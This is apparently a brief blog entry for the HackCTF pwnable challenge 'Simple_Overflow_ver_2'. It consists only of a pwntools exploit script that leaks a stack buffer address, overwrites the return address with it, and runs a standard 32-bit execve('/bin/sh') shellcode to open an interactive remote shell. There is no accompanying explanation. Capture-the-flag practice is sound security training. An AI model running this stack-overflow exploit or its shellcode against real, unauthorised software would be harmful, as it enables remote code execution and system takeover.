---
title: "[HackCtf] Simple_Overflow_ver_2"
date: 2020-07-09
ctf: HackCTF
tag: [pwnable]
layout: post
---

{% highlight python %}
from pwn import *

context.log_level="debug"

p = remote("ctf.j0n9hyun.xyz", 3006)
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"
print(p.recv(1024))
p.sendline("A")
p.recvuntil("0x")
buf = int(p.recv(1024)[:8],16)
print(hex(buf))
p.sendline("y")

payload = shellcode
payload+= "\x90"*115
payload+= p32(buf)
p.sendline(payload)
print(p.recv(1024))
p.interactive()
{% endhighlight %}
